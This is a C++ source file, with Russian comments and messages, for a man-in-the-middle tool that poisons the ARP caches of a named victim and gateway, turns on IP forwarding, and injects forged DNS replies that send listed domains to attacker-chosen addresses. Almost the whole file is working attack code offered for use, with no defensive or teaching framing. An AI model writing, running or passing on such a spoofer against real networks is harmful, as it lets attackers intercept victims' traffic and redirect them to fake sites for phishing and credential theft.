#include <iostream>
#include <map>
#include <string>
#include <fstream>
#include <thread>
#include <chrono>
#include <csignal>
#include <cstring>        // ← Добавлено
#include <pcap.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <net/ethernet.h>
#include <net/if_arp.h>   // ← Добавлено для ARP

std::map<std::string, std::string> spoof_map;
std::string interface, target_ip, gateway_ip;
u_char my_mac[6] = {0};
pcap_t* handle = nullptr;
bool running = true;

void load_hosts(const std::string& file) {
    std::ifstream f(file);
    std::string dom, ip;
    while (f >> dom >> ip) {
        spoof_map[dom] = ip;
    }
    std::cout << "[*] Загружено " << spoof_map.size() << " правил из " << file << std::endl;
}

void enable_forward() {
    system("sysctl -w net.ipv4.ip_forward=1 >/dev/null 2>&1");
    std::cout << "[*] IP Forwarding включён" << std::endl;
}

void get_my_mac() {
    struct ifreq ifr;
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    strncpy(ifr.ifr_name, interface.c_str(), IFNAMSIZ-1);
    if (ioctl(s, SIOCGIFHWADDR, &ifr) < 0) {
        std::cerr << "[-] Не удалось получить MAC адрес" << std::endl;
    } else {
        memcpy(my_mac, ifr.ifr_hwaddr.sa_data, 6);
        std::cout << "[*] MAC адрес: ";
        for(int i=0; i<6; i++) printf("%02x%s", my_mac[i], i<5?":":"");
        std::cout << std::endl;
    }
    close(s);
}

void send_arp(const u_char* dest_mac, const char* target_ip_str, const char* spoof_ip_str) {
    u_char packet[42] = {0};
    struct ether_header* eth = (struct ether_header*)packet;
    memcpy(eth->ether_dhost, dest_mac, 6);
    memcpy(eth->ether_shost, my_mac, 6);
    eth->ether_type = htons(ETHERTYPE_ARP);

    struct arphdr* arp = (struct arphdr*)(packet + 14);
    arp->ar_hrd = htons(ARPHRD_ETHER);
    arp->ar_pro = htons(ETHERTYPE_IP);
    arp->ar_hln = 6;
    arp->ar_pln = 4;
    arp->ar_op = htons(ARPOP_REPLY);

    memcpy(packet + 22, my_mac, 6);                    // Sender MAC
    uint32_t spoof = inet_addr(spoof_ip_str);
    memcpy(packet + 28, &spoof, 4);                    // Sender IP
    memcpy(packet + 32, dest_mac, 6);                  // Target MAC
    uint32_t target = inet_addr(target_ip_str);
    memcpy(packet + 38, &target, 4);                   // Target IP

    pcap_inject(handle, packet, 42);
}

void send_dns_spoof(const u_char* pkt, const std::string& spoof_ip) {
    const u_char* ip_hdr = pkt + 14;
    const u_char* udp_hdr = ip_hdr + (((struct ip*)ip_hdr)->ip_hl * 4);
    const u_char* dns = udp_hdr + 8;

    uint16_t dns_id = *(uint16_t*)(dns - 2);

    char qname[256] = {0};
    int i = 0, j = 0;
    while (dns[i] && i < 200) {
        int len = dns[i++];
        memcpy(qname + j, dns + i, len);
        j += len;
        qname[j++] = '.';
        i += len;
    }
    if (j > 0) qname[j-1] = 0;

    auto it = spoof_map.find(qname);
    if (it == spoof_map.end()) return;

    std::cout << "[+] Spoofed: " << qname << " → " << it->second << std::endl;

    // DNS Response
    u_char response[512];
    int len = 0;
    uint8_t header[12] = {(uint8_t)(dns_id>>8), (uint8_t)dns_id, 0x81, 0x80, 0,1, 0,1, 0,0,0,0};
    memcpy(response, header, 12); len += 12;

    int qlen = i + 5;
    memcpy(response + len, dns - 2, qlen + 2); len += qlen + 2;

    uint8_t ans[14] = {0xc0,0x0c,0,1,0,1,0,0,0,60,0,4};
    memcpy(response + len, ans, 14); len += 14;
    uint32_t ip = inet_addr(it->second.c_str());
    memcpy(response + len, &ip, 4); len += 4;

    // Full packet
    u_char full[1024] = {0};
    struct ether_header* eth = (struct ether_header*)full;
    memcpy(eth->ether_dhost, pkt + 6, 6);
    memcpy(eth->ether_shost, my_mac, 6);
    eth->ether_type = htons(ETHERTYPE_IP);

    struct ip* iph = (struct ip*)(full + 14);
    *iph = *(struct ip*)ip_hdr;
    iph->ip_src.s_addr = ((struct ip*)ip_hdr)->ip_dst.s_addr;
    iph->ip_dst.s_addr = ((struct ip*)ip_hdr)->ip_src.s_addr;
    iph->ip_len = htons(20 + 8 + len);
    iph->ip_ttl = 64;
    iph->ip_sum = 0;

    struct udphdr* udph = (struct udphdr*)(full + 14 + 20);
    udph->uh_sport = htons(53);
    udph->uh_dport = ((struct udphdr*)udp_hdr)->uh_sport;
    udph->uh_ulen = htons(8 + len);
    udph->uh_sum = 0;

    memcpy(full + 14 + 20 + 8, response, len);

    pcap_inject(handle, full, 14 + 20 + 8 + len);
}

void packet_handler(u_char*, const struct pcap_pkthdr*, const u_char* pkt) {
    send_dns_spoof(pkt, "");
}

int main(int argc, char** argv) {
    if (argc < 4) {
        std::cout << "Usage: sudo " << argv[0] << " <interface> <victim_ip> <gateway_ip> [hosts.txt]\n";
        return 1;
    }

    interface = argv[1];
    target_ip = argv[2];
    gateway_ip = argv[3];

    signal(SIGINT, [](int){ running = false; });

    enable_forward();
    get_my_mac();

    char err[PCAP_ERRBUF_SIZE];
    handle = pcap_open_live(interface.c_str(), 65536, 1, 1000, err);
    if (!handle) {
        std::cerr << "pcap_open_live: " << err << std::endl;
        return 1;
    }

    if (argc > 4) load_hosts(argv[4]);

    std::cout << "[*] MITM DNS + ARP Spoofer запущен\n";

    std::thread arp_thread([]() {
        u_char broadcast[6] = {0xff,0xff,0xff,0xff,0xff,0xff};
        while (running) {
            send_arp(broadcast, target_ip.c_str(), gateway_ip.c_str());
            send_arp(broadcast, gateway_ip.c_str(), target_ip.c_str());
            std::this_thread::sleep_for(std::chrono::seconds(2));
        }
    });

    pcap_loop(handle, 0, packet_handler, nullptr);

    running = false;
    arp_thread.join();
    system(("ip neigh flush dev " + interface).c_str());
    pcap_close(handle);

    std::cout << "[*] Завершено.\n";
    return 0;
}